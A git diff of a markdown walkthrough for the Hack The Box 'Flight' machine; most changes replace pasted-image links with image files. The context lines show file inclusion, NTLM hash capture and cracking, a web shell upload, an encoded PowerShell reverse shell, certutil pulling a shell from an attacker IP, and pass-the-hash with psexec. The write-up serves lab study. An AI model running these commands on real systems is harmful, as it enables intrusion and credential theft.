@@ -89,7 +89,7 @@ g0.flight.htb.          1200    IN      AAAA    dead:beef::459a:a3e2:9dc2:b376
 Let’s start by taking a quick look at the different features of the website :
 
 
-![BloodHound Analysis](images/sauna1.png)
+![BloodHound Analysis](images/flight1.png)
 
 This seems to be a static page and it will not be useful. Let’s keep on our enumeration :
 
@@ -164,23 +164,23 @@ cat  /etc/hosts
 
 We will repeat the same enumeration as we did above for the new virtual host :
 
-![[Pasted image 20251027191901.png]]
+![BloodHound Analysis](images/flight2.png)
 
 As you can see, the **view** parameter seems to display the content of a page.
 
 This is an old method used by web developers to display the content of web pages. When seeing such things, I generally think of directory path transversal and file inclusions (LFI, RFI) attacks. Let’s check that
 
-![[Pasted image 20251027192036.png]]
+![BloodHound Analysis](images/flight3.png)
 
 t seems that there are some sort of filtering put in place by the server. Let’s see if this was implemented on the server or client side ?
 
 When replacing blog.html with index.php in the view parameter, I came across this :
 
-![[Pasted image 20251027192221.png]]
+![BloodHound Analysis](images/flight4.png)
 
 Indeed, the server is performing some filtering on its side as highlighted on the image above.
 
-![[Pasted image 20251027192536.png]]
+![BloodHound Analysis](images/flight5.png)
 
 ### Remote File Inclusion
 
@@ -190,11 +190,11 @@ Enough said ! Let’s walk the talk :
 
 **1/ Launching an SMB server**
 
-![[Pasted image 20251027193531.png]]
+![BloodHound Analysis](images/flight6.png)
 
 **2/ Forcing the web server to connect to our SMB server**
 
-![[Pasted image 20251027193610.png]]
+![BloodHound Analysis](images/flight7.png)
 
 **Note :** I did not use back slashes because it is blocked by the web server.
 
@@ -206,7 +206,7 @@ Let’s try to crack the intercepted hash using hashcat :
 hashcat svc_apache-net-ntlmv2 /usr/share/wordlists/rockyou.txt
 ```
 
-![[Pasted image 20251027193647.png]]
+![BloodHound Analysis](images/flight8.png)
 
 we get  apassword
 
@@ -415,7 +415,7 @@ drw-rw-rw-          0  Tue Oct 28 00:27:00 2025 school.flight.htb
 # put shell.php
 ```
 
-![[Pasted image 20251027214147.png]]
+![BloodHound Analysis](images/flight9.png)
 
 nteresting ! We have write access to the **Web** share. This means that we could potentially upload a reverse shell or web shell on the server and obtain a shell. Here I used [p0wny shell](https://github.com/flozz/p0wny-shell) :
 
@@ -440,7 +440,7 @@ powershell -e JABzAD0AJwAxADAALgAxADAALgAxADYALgAzADIAOgA5ADkAOQA5ACcAOwAkAGkAPQ
 ```
 
 
-![[Pasted image 20251027221234.png]]
+![BloodHound Analysis](images/flight10.png)
 
 ```bash
 oaxshell > whoami
@@ -671,7 +671,7 @@ powershell -WindowStyle Hidden -Command "Start-Process 'chisel-windows.exe' -Arg
 
 ```
 
-![[Pasted image 20251029173744.png]]
+![BloodHound Analysis](images/flight11.png)
 
 
 
@@ -679,7 +679,7 @@ powershell -WindowStyle Hidden -Command "Start-Process 'chisel-windows.exe' -Arg
 C:\inetpub\development>echo "test" > wali.txt
 ```
 
-![[Pasted image 20251029190408.png]]
+![BloodHound Analysis](images/flight12.png)
 
 ```bash
 certutil -urlcache -split -f http://10.10.16.12:8001/shell.aspx C:\inetpub\development\shell.aspx
@@ -889,10 +889,7 @@ psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c
 ```
 
 
-```bash
 
-
-```
 
 
 
